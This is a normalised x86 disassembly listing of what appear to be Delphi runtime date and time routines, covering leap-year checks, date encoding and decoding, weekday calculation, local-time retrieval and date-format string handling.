movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407c6c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407c6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40966c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4096a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40966c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409770
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4096a8
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407c88
sub_4097a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40951c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407c6c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407c6c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407c6c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40966c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4098ec
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4097a0
pop esi
pop ecx
pop ebp
retn 0x8
sub_40990c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
lea ecx [ ebx + 0x6 ]
lea edx [ ebx + 0x2 ]
mov eax ebx
call sub_4097a0
dec [ ebx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebx + 0xe ]
push eax
lea ecx [ ebx + 0xc ]
lea edx [ ebx + 0xa ]
lea eax [ ebx + 0x8 ]
call sub_409610
pop ebx
pop ebp
retn 0x8
sub_40994c
push ebx
add esp 0xfffffff8
mov ebx eax
mov cx [ ebx + 0x6 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409770
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_4095d0
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xe ]
push eax
mov cx [ ebx + 0xc ]
mov dx [ ebx + 0xa ]
mov ax [ ebx + 0x8 ]
call sub_4095d0
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_4099bc
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40951c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4099e4
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409770
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_4095d0
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_409a34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402aa8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402a78
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402a78
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409a9c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_409ae0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042c8
mov edx eax
mov eax ebx
call sub_409a9c
pop ecx
pop ebx
pop ebp
retn
sub_409b00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408908
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409a9c
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409b4c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409b78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4098ec
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409bb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409610
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409bf0
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404008
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d45
lea eax [ ebp - 0x118 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404278
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
call sub_40c180
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c2f4
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404528
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c290
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404200
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c2f4
mov ecx eax
mov eax ebx
mov edx esi
call sub_4040f8
sub_409d58
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409e36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404008
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409e3d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404278
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404528
sub_409e60
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a5e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a5e8
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c374
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c354
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409a9c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c374
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a9c
pop ecx
mov al [ eax + lookup_table_409f43 ]
jmp [ eax * 4 + jump_table_409f7c ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409b78
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409b78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409bf0
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409ae0
pop ecx
jmp r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409b78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409d58
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409ae0
pop ecx
jmp r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409b78
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409b4c
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409bb0
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409bb0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409bb0
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409b4c
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409b4c
pop ecx
push ebp
call sub_409bb0
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409bb0
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408778
test eax eax
jne r-xdata
push ebp
call sub_409b4c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
push ebp
call sub_409bb0
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409b00
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409b00
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409b78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408778
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409a9c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a9c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a9c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408778
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409a9c
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409a9c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c374
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408778
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409a9c
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409b00
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408778
test eax eax
jne r-xdata
push ebp
call sub_409b78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ae0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ae0
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c374
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409e60
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a9c
pop ecx
jmp r-xdata
push ebp
call sub_409b78
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4099bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409ae0
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408778
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408778
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408778
test eax eax
jne r-xdata
jmp r-xdata
sub_40a614
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409e60
pop ecx
push ebp
mov eax ebx
call sub_409e60
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_4040f8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a69c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4042c8
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a6c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a69c
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4042c8
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a754
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a7cd
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a7d4
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a69c
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4042c8
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404528
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407ec0
test eax eax
jne r-xdata
mov eax edi
call sub_4042c8
add [ esi ] eax
mov bl 0x1
sub_40a7e0
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a69c
mov eax esi
call sub_4042c8
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a818
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
